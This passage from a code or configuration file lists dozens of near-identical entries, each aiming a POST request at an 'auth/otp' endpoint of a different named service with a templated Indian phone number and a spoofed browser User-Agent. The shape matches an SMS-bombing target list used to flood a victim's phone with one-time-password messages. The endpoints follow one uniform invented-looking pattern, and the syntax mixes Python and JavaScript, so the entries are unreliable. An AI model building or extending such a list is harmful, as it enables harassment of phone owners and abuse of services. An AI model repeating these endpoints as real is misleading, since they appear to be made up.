    {
        'name': 'Mural_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.mural.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Lucidspark_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.lucidspark.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Stormboard_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.stormboard.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Conceptboard_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.conceptboard.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Sketchboard_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.sketchboard.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Mindmeister_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.mindmeister.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Mindomo_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.mindomo.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'XMind_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.xmind.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Coggle_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.coggle.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Lucidchart_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.lucidchart.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'SmartDraw_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.smartdraw.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Draw.io_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.drawio.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Creately_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.creately.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Gliffy_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.gliffy.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Whimsical_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.whimsical.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Scribblar_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.scribblar.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Twiddla_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.twiddla.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Bubble_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.bubble.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Adalo_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.adalo.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Glide_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.glide.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'OutSystems_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.outsystems.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Mendix_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.mendix.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'PowerApps_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.powerapps.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Appian_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.appian.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Pega_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.pega.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Salesforce_Platform_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.salesforceplatform.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'ServiceNow_Platform_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.servicenowplatform.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Zoho_Creator_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.zohocreator.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Airtable_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.airtable.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Smartsheet_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.smartsheet.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Monday_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.monday.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'ClickUp_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.clickup.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Asana_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.asana.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Trello_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.trello.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Jira_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.jira.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Confluence_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.confluence.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Basecamp_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.basecamp.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Teamwork_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.teamwork.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Wrike_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.wrike.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Podio_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.podio.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Redmine_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.redmine.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Taiga_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.taiga.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'MantisBT_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.mantisbt.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Bugzilla_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.bugzilla.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'GitLab_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.gitlab.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'GitHub_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.github.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Bitbucket_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.bitbucket.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'SourceForge_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.sourceforge.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Codeberg_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.codeberg.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Gitee_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.gitee.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'GitKraken_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.gitkraken.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Sourcetree_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.sourcetree.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Fork_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.fork.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Tower_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.tower.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'GitExtensions_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.gitextensions.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'SmartGit_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.smartgit.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'GitCola_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.gitcola.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'GitAhead_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.gitahead.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'GitFinder_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.gitfinder.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'WorkingCopy_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.workingcopy.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'CodeHub_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.codehub.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Git2Go_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.git2go.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Pocket_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.pocket.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Instapaper_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.instapaper.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Readwise_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.readwise.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Matter_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.matter.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Feedly_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.feedly.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Inoreader_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.inoreader.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'NewsBlur_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.newsblur.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'TheOldReader_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.theoldreader.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'NetNewsWire_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.netnewswire.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Reeder_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.reeder.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Fiery_Feeds_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.fieryfeeds.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Unread_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.unread.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Lire_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.lire.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'ReadKit_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.readkit.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Vienna_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.vienna.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'RSSOwl_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.rssowl.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'QuiteRSS_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.quiterss.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Liferea_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.liferea.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'FeedReader_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.feedreader.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'RSSBandit_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.rssbandit.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'RSSGuard_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.rssguard.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'FluentReader_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.fluentreader.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'GoodLinks_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.goodlinks.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Curtail_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.curtail.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Wallabag_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.wallabag.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Shiori_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.shiori.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'LinkAce_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.linkace.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Raindrop_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.raindrop.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'BookmarkOS_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.bookmarkos.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'StartMe_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.startme.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Papaly_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.papaly.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Booky_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.booky.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Diigo_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.diigo.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Delicious_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.delicious.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Pinboard_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.pinboard.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'ScoopIt_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.scoopit.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Paperli_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.paperli.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
